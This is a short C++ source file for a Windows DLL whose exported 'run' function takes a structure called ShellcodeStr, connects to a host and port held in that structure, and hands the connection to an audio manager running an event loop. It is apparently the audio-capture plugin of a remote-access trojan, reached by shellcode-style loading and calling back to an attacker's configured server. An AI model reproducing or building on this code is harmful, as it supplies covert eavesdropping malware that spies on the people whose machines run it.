// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include"AudioManager.h"
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) BOOL run(ShellcodeStr * m_Str)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(m_Str->modify_data.DNS, m_Str->modify_data.Port))
    {
        return -1;
    }

    CAudioManager manager(&socketClient);
    socketClient.run_event_loop();

    return 0;
}
